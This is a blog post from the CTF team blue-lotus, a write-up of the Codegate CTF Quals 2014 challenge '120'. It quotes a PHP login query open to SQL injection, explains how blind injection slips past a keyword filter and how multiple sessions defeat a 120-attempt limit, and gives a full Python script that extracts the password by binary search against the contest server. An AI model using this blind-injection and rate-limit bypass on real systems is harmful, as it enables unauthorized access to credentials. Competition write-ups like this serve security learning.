
<!DOCTYPE html>
<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
<head>
  <meta charset="utf-8">
  <title>Codegate CTF Quals 2014 120 writeup - blue-lotus</title>
  <meta name="author" content="blue-lotus">

  
  <meta name="description" content="Analysis SQL Injection There’s an SQL injection at $query = "select * from rms_120_pw where (ip='$_SERVER[REMOTE_ADDR]') and (password='$_POST[ &hellip;">
  

  <!-- http://t.co/dKP3o1e -->
  <meta name="HandheldFriendly" content="True">
  <meta name="MobileOptimized" content="320">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  
  <link rel="canonical" href="http://www.blue-lotus.net//2014-02-25-codegate-ctf-quals-2014-120-writeup">
  <link href="/favicon.png" rel="icon">
  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
  <link href="/atom.xml" rel="alternate" title="blue-lotus" type="application/atom+xml">
  <script src="/javascripts/modernizr-2.0.js"></script>
  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
  <script>!window.jQuery && document.write(unescape('%3Cscript src="./javascripts/lib/jquery.min.js"%3E%3C/script%3E'))</script>
  <script src="/javascripts/octopress.js" type="text/javascript"></script>
  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
<link href="http://fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
<link href="http://fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">

  

</head>

<body   >
  <header role="banner"><hgroup>
  <div id="header-inner">
    <span class="first"><a href="/">blue-lotus</a></span>
    <span><a href="/about">about</a></span>
    <span class="last"><a href="/atom.xml" title="subscribe via RSS">rss</a></span>
  </div>
</hgroup>

</header>
  <div id="main">
    <div id="content">
      <div>
<article class="hentry" role="article">
  
  <header>
    
      <h1 class="entry-title">Codegate CTF Quals 2014 120 Writeup</h1>
    
    
      <p class="meta">
        








  


<time datetime="2014-02-25T00:00:00+08:00" pubdate data-updated="true">Feb 25<span>th</span>, 2014</time>
        
      </p>
    
  </header>


<div class="entry-content"><h2 id="analysis">Analysis</h2>

<h3 id="sql-injection">SQL Injection</h3>

<p>There’s an SQL injection at </p>

<pre><code>  $query = "select * from rms_120_pw where (ip='$_SERVER[REMOTE_ADDR]') and (password='$_POST[password]')";
</code></pre>

<p>and the keyword filter does NOT filter blind injection.</p>

<pre><code>  if (eregi("replace|load|information|union|select|from|where|limit|offset|order|by|ip|\.|#|-|/|\*",$_POST['password'])){
</code></pre>

<p>so we can post password=</p>

<pre><code>' or (CONDITION) and '1'='1
</code></pre>

<p>to test whether the CONDITION is true of fasle.</p>

<p>And we can use binary search to get every byte of password.</p>

<p>But there’s ONE more limit. The retry time is only 120 times. But <code>log(26)*30 &gt; 120</code>.</p>

<h3 id="by-pass-120-times-limit">By-pass 120 times limit</h3>

<p>The retry is limited to 120 times by the following code.</p>

<pre><code>if ( !isset($_SESSION['cnt'])){
    $_SESSION['cnt']=0;
    $_SESSION['password']=RandomString();
    
    $query = "delete from rms_120_pw where ip='$_SERVER[REMOTE_ADDR]'";
    @mysql_query($query);
    
    $query = "insert into rms_120_pw values('$_SERVER[REMOTE_ADDR]',             '$_SESSION[password]')";
    @mysql_query($query);
}
</code></pre>

<p>There’s one way to bypass it.</p>

<p>We need to make serveral queries without any session to get multiple sessions. And each time we request, the password is reset to another random value, so only the password generated in the last query is acceptable. But the <code>$_SESSION['cnt']</code> is still 120 for previous sessions. We can get at most <code>120 * num_of_sessions</code> times to do binary search blind injection.</p>

<h2 id="exploit-code">Exploit Code</h2>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
<span class="line-number">7</span>
<span class="line-number">8</span>
<span class="line-number">9</span>
<span class="line-number">10</span>
<span class="line-number">11</span>
<span class="line-number">12</span>
<span class="line-number">13</span>
<span class="line-number">14</span>
<span class="line-number">15</span>
<span class="line-number">16</span>
<span class="line-number">17</span>
<span class="line-number">18</span>
<span class="line-number">19</span>
<span class="line-number">20</span>
<span class="line-number">21</span>
<span class="line-number">22</span>
<span class="line-number">23</span>
<span class="line-number">24</span>
<span class="line-number">25</span>
<span class="line-number">26</span>
<span class="line-number">27</span>
<span class="line-number">28</span>
<span class="line-number">29</span>
<span class="line-number">30</span>
<span class="line-number">31</span>
<span class="line-number">32</span>
<span class="line-number">33</span>
<span class="line-number">34</span>
<span class="line-number">35</span>
<span class="line-number">36</span>
<span class="line-number">37</span>
<span class="line-number">38</span>
<span class="line-number">39</span>
<span class="line-number">40</span>
<span class="line-number">41</span>
<span class="line-number">42</span>
<span class="line-number">43</span>
<span class="line-number">44</span>
<span class="line-number">45</span>
<span class="line-number">46</span>
<span class="line-number">47</span>
<span class="line-number">48</span>
<span class="line-number">49</span>
<span class="line-number">50</span>
<span class="line-number">51</span>
<span class="line-number">52</span>
<span class="line-number">53</span>
<span class="line-number">54</span>
<span class="line-number">55</span>
<span class="line-number">56</span>
<span class="line-number">57</span>
<span class="line-number">58</span>
<span class="line-number">59</span>
<span class="line-number">60</span>
<span class="line-number">61</span>
<span class="line-number">62</span>
<span class="line-number">63</span>
<span class="line-number">64</span>
<span class="line-number">65</span>
<span class="line-number">66</span>
<span class="line-number">67</span>
<span class="line-number">68</span>
<span class="line-number">69</span>
<span class="line-number">70</span>
<span class="line-number">71</span>
<span class="line-number">72</span>
<span class="line-number">73</span>
<span class="line-number">74</span>
<span class="line-number">75</span>
<span class="line-number">76</span>
<span class="line-number">77</span>
<span class="line-number">78</span>
<span class="line-number">79</span>
<span class="line-number">80</span>
<span class="line-number">81</span>
<span class="line-number">82</span>
<span class="line-number">83</span>
<span class="line-number">84</span>
<span class="line-number">85</span>
<span class="line-number">86</span>
<span class="line-number">87</span>
<span class="line-number">88</span>
<span class="line-number">89</span>
<span class="line-number">90</span>
<span class="line-number">91</span>
<span class="line-number">92</span>
<span class="line-number">93</span>
<span class="line-number">94</span>
<span class="line-number">95</span>
</pre></td><td class="code"><pre><code class="python"><span class="line"><span class="c">#!/usr/bin/env python2</span>
</span><span class="line"><span class="kn">import</span> <span class="nn">requests</span>
</span><span class="line">
</span><span class="line">
</span><span class="line"><span class="n">ss</span> <span class="o">=</span> <span class="p">[]</span>
</span><span class="line">
</span><span class="line"><span class="n">session_pool</span> <span class="o">=</span> <span class="p">[</span>
</span><span class="line">        <span class="n">requests</span><span class="o">.</span><span class="n">session</span><span class="p">(),</span>
</span><span class="line">        <span class="n">requests</span><span class="o">.</span><span class="n">session</span><span class="p">(),</span>
</span><span class="line">        <span class="n">requests</span><span class="o">.</span><span class="n">session</span><span class="p">(),</span>
</span><span class="line">        <span class="n">requests</span><span class="o">.</span><span class="n">session</span><span class="p">(),</span>
</span><span class="line">        <span class="n">requests</span><span class="o">.</span><span class="n">session</span><span class="p">(),</span>
</span><span class="line">        <span class="n">requests</span><span class="o">.</span><span class="n">session</span><span class="p">(),</span>
</span><span class="line">        <span class="n">requests</span><span class="o">.</span><span class="n">session</span><span class="p">(),</span>
</span><span class="line">        <span class="n">requests</span><span class="o">.</span><span class="n">session</span><span class="p">(),</span>
</span><span class="line">        <span class="p">]</span>
</span><span class="line">
</span><span class="line"><span class="n">counter</span> <span class="o">=</span> <span class="p">[</span>
</span><span class="line">        <span class="mi">1</span><span class="p">,</span>
</span><span class="line">        <span class="mi">1</span><span class="p">,</span>
</span><span class="line">        <span class="mi">1</span><span class="p">,</span>
</span><span class="line">        <span class="mi">1</span><span class="p">,</span>
</span><span class="line">        <span class="mi">1</span><span class="p">,</span>
</span><span class="line">        <span class="mi">1</span><span class="p">,</span>
</span><span class="line">        <span class="mi">1</span><span class="p">,</span>
</span><span class="line">        <span class="mi">1</span><span class="p">,</span>
</span><span class="line">        <span class="p">]</span>
</span><span class="line">
</span><span class="line"><span class="n">s</span> <span class="o">=</span> <span class="n">session_pool</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
</span><span class="line"><span class="nb">id</span> <span class="o">=</span> <span class="mi">0</span>
</span><span class="line">
</span><span class="line">
</span><span class="line"><span class="k">for</span> <span class="n">sss</span> <span class="ow">in</span> <span class="n">session_pool</span><span class="p">:</span>
</span><span class="line">    <span class="k">assert</span> <span class="n">sss</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="s">&#39;http://58.229.183.24/5a520b6b783866fd93f9dcdaf753af08/&#39;</span><span class="p">,</span>
</span><span class="line">                <span class="n">data</span><span class="o">=</span><span class="p">{</span>
</span><span class="line">                    <span class="s">&#39;password&#39;</span><span class="p">:</span> <span class="s">&quot;&#39; OR LENGTH(password) = 30 AND &#39;1&#39;= &#39;1&quot;</span>
</span><span class="line">                    <span class="p">}</span>
</span><span class="line">                <span class="p">)</span><span class="o">.</span><span class="n">text</span> <span class="o">==</span> <span class="s">u&#39;True&#39;</span>
</span><span class="line">
</span><span class="line">
</span><span class="line">
</span><span class="line">
</span><span class="line"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">31</span><span class="p">):</span>
</span><span class="line">    <span class="n">l</span> <span class="o">=</span> <span class="mi">97</span>
</span><span class="line">    <span class="n">r</span> <span class="o">=</span> <span class="mi">122</span>
</span><span class="line">    <span class="n">j</span> <span class="o">=</span> <span class="p">(</span><span class="n">l</span> <span class="o">+</span> <span class="n">r</span><span class="p">)</span> <span class="o">/</span> <span class="mi">2</span>
</span><span class="line">    <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
</span><span class="line">        <span class="k">print</span> <span class="n">i</span><span class="p">,</span> <span class="n">l</span><span class="p">,</span> <span class="n">r</span><span class="p">,</span> <span class="n">j</span><span class="p">,</span> <span class="nb">id</span><span class="p">,</span> <span class="n">counter</span><span class="p">[</span><span class="nb">id</span><span class="p">]</span>
</span><span class="line">        <span class="n">res</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="s">&#39;http://58.229.183.24/5a520b6b783866fd93f9dcdaf753af08/&#39;</span><span class="p">,</span>
</span><span class="line">                <span class="n">data</span><span class="o">=</span><span class="p">{</span>
</span><span class="line">                    <span class="s">&#39;password&#39;</span><span class="p">:</span> <span class="s">&quot;&#39; OR ASCII(SUBSTRING(password, </span><span class="si">%d</span><span class="s">, 1)) &gt;= </span><span class="si">%d</span><span class="s"> AND &#39;1&#39;= &#39;1&quot;</span> <span class="o">%</span> <span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="n">j</span><span class="p">)</span>
</span><span class="line">                    <span class="p">}</span>
</span><span class="line">                <span class="p">)</span><span class="o">.</span><span class="n">text</span>
</span><span class="line">        <span class="n">counter</span><span class="p">[</span><span class="nb">id</span><span class="p">]</span> <span class="o">+=</span> <span class="mi">1</span>
</span><span class="line">        <span class="k">if</span> <span class="n">counter</span><span class="p">[</span><span class="nb">id</span><span class="p">]</span> <span class="o">&gt;</span> <span class="mi">100</span><span class="p">:</span>
</span><span class="line">            <span class="nb">id</span> <span class="o">+=</span> <span class="mi">1</span>
</span><span class="line">            <span class="n">s</span> <span class="o">=</span> <span class="n">session_pool</span><span class="p">[</span><span class="nb">id</span><span class="p">]</span>
</span><span class="line">        <span class="k">if</span> <span class="s">&#39;True&#39;</span> <span class="ow">in</span> <span class="n">res</span><span class="p">:</span>
</span><span class="line">            <span class="n">l</span> <span class="o">=</span> <span class="n">j</span>
</span><span class="line">            <span class="n">j</span> <span class="o">=</span> <span class="p">(</span><span class="n">l</span> <span class="o">+</span> <span class="n">r</span><span class="p">)</span> <span class="o">/</span> <span class="mi">2</span>
</span><span class="line">            <span class="k">if</span> <span class="n">r</span> <span class="o">==</span> <span class="n">l</span> <span class="o">+</span> <span class="mi">1</span><span class="p">:</span>
</span><span class="line">                <span class="n">res2</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="s">&#39;http://58.229.183.24/5a520b6b783866fd93f9dcdaf753af08/&#39;</span><span class="p">,</span>
</span><span class="line">                        <span class="n">data</span><span class="o">=</span><span class="p">{</span>
</span><span class="line">                            <span class="s">&#39;password&#39;</span><span class="p">:</span> <span class="s">&quot;&#39; OR ASCII(SUBSTRING(password, </span><span class="si">%d</span><span class="s">, 1)) = </span><span class="si">%d</span><span class="s"> AND &#39;1&#39;= &#39;1&quot;</span> <span class="o">%</span> <span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="n">j</span><span class="p">)</span>
</span><span class="line">                            <span class="p">}</span>
</span><span class="line">                        <span class="p">)</span><span class="o">.</span><span class="n">text</span>
</span><span class="line">                <span class="n">counter</span><span class="p">[</span><span class="nb">id</span><span class="p">]</span> <span class="o">+=</span> <span class="mi">1</span>
</span><span class="line">                <span class="k">if</span> <span class="n">counter</span><span class="p">[</span><span class="nb">id</span><span class="p">]</span> <span class="o">&gt;</span> <span class="mi">100</span><span class="p">:</span>
</span><span class="line">                    <span class="nb">id</span> <span class="o">+=</span> <span class="mi">1</span>
</span><span class="line">                    <span class="n">s</span> <span class="o">=</span> <span class="n">session_pool</span><span class="p">[</span><span class="nb">id</span><span class="p">]</span>
</span><span class="line">
</span><span class="line">                <span class="k">if</span> <span class="s">&#39;True&#39;</span> <span class="ow">in</span> <span class="n">res2</span><span class="p">:</span>
</span><span class="line">                    <span class="k">print</span> <span class="n">j</span>
</span><span class="line">                    <span class="n">ss</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">j</span><span class="p">)</span>
</span><span class="line">                    <span class="k">break</span>
</span><span class="line">                <span class="k">else</span><span class="p">:</span>
</span><span class="line">                    <span class="k">print</span> <span class="n">j</span> <span class="o">+</span> <span class="mi">1</span>
</span><span class="line">                    <span class="n">ss</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">j</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span>
</span><span class="line">                    <span class="k">break</span>
</span><span class="line">            <span class="k">elif</span> <span class="n">l</span> <span class="o">==</span> <span class="n">r</span><span class="p">:</span>
</span><span class="line">                <span class="k">print</span> <span class="n">l</span>
</span><span class="line">                <span class="n">ss</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">l</span><span class="p">)</span>
</span><span class="line">                <span class="k">break</span>
</span><span class="line">        <span class="k">else</span><span class="p">:</span>
</span><span class="line">            <span class="n">r</span> <span class="o">=</span> <span class="n">j</span> <span class="o">-</span> <span class="mi">1</span>
</span><span class="line">            <span class="n">j</span> <span class="o">=</span> <span class="p">(</span><span class="n">l</span> <span class="o">+</span> <span class="n">r</span><span class="p">)</span> <span class="o">/</span> <span class="mi">2</span>
</span><span class="line">
</span><span class="line"><span class="k">print</span> <span class="s">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="nb">map</span><span class="p">(</span><span class="nb">chr</span><span class="p">,</span> <span class="n">ss</span><span class="p">))</span>
</span><span class="line">
</span><span class="line">
</span><span class="line"><span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="s">&#39;http://58.229.183.24/5a520b6b783866fd93f9dcdaf753af08/auth.php&#39;</span><span class="p">,</span>
</span><span class="line">        <span class="n">data</span><span class="o">=</span><span class="p">{</span>
</span><span class="line">            <span class="s">&#39;password&#39;</span><span class="p">:</span> <span class="s">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="nb">map</span><span class="p">(</span><span class="nb">chr</span><span class="p">,</span> <span class="n">ss</span><span class="p">))</span>
</span><span class="line">            <span class="p">}</span>
</span><span class="line">        <span class="p">)</span><span class="o">.</span><span class="n">text</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

</div>


  <footer>
    <p class="meta">
      
  

<span class="byline author vcard">Posted by <span class="fn">fqj</span></span>

      








  


<time datetime="2014-02-25T00:00:00+08:00" pubdate data-updated="true">Feb 25<span>th</span>, 2014</time>
      

<span class="categories">
  
    <a class='category' href='/blog/categories/ctf/'>CTF</a>, <a class='category' href='/blog/categories/writeup/'>writeup</a>
  
</span>


    </p>
    
      <div class="sharing">
  
  
  
</div>

    
    <p class="meta">
      
        <a class="basic-alignment left" href="/csaw-ctf-quals-2013-exp300-writeup/" title="Previous Post: CSAW CTF Quals 2013 Exploitation 300 writeup">&laquo; CSAW CTF Quals 2013 Exploitation 300 writeup</a>
      
      
        <a class="basic-alignment right" href="/2014-02-25-codegate-ctf-quals-2014-angry_doraemon-writeup/" title="Next Post: Codegate CTF Quals 2014 Angry Doraemon writeup">Codegate CTF Quals 2014 Angry Doraemon writeup &raquo;</a>
      
    </p>
  </footer>
</article>

  <section>
    <h1>Comments</h1>
    <div id="disqus_thread" aria-live="polite"><noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
</div>
  </section>

</div>

<aside class="sidebar">
  
    <section>
  <h1>Recent Posts</h1>
  <ul id="recent_posts">
    
      <li class="post">
        <a href="/2014-02-25-codegate-ctf-quals-2014-weirdshark-writeup/">Codegate CTF Quals 2014 Weirdshark Writeup</a>
      </li>
    
      <li class="post">
        <a href="/2014-02-25-codegate-ctf-quals-2014-weird_snus-writeup/">Codegate CTF Quals 2014 Weird_snus Writeup</a>
      </li>
    
      <li class="post">
        <a href="/2014-02-25-codegate-ctf-quals-2014-web_proxy-writeup/">Codegate CTF Quals 2014 Web Proxy Writeup</a>
      </li>
    
      <li class="post">
        <a href="/2014-02-25-codegate-ctf-quals-2014-clone-technique-writeup/">Codegate CTF Quals 2014 Clone Technique Writeup</a>
      </li>
    
      <li class="post">
        <a href="/2014-02-25-codegate-ctf-quals-2014-chrono-writeup/">Codegate CTF Quals 2014 Chrono Writeup</a>
      </li>
    
  </ul>
</section>





  
</aside>


    </div>
  </div>
  <footer role="contentinfo"><p>
  Copyright &copy; 2014 - blue-lotus -
  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
</p>

</footer>
  

<script type="text/javascript">
      var disqus_shortname = 'bluelotus';
      
        
        // var disqus_developer = 1;
        var disqus_identifier = 'http://www.blue-lotus.net//2014-02-25-codegate-ctf-quals-2014-120-writeup/';
        var disqus_url = 'http://www.blue-lotus.net//2014-02-25-codegate-ctf-quals-2014-120-writeup/';
        var disqus_script = 'embed.js';
      
    (function () {
      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
      dsq.src = 'http://' + disqus_shortname + '.disqus.com/' + disqus_script;
      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
    }());
</script>











</body>
</html>
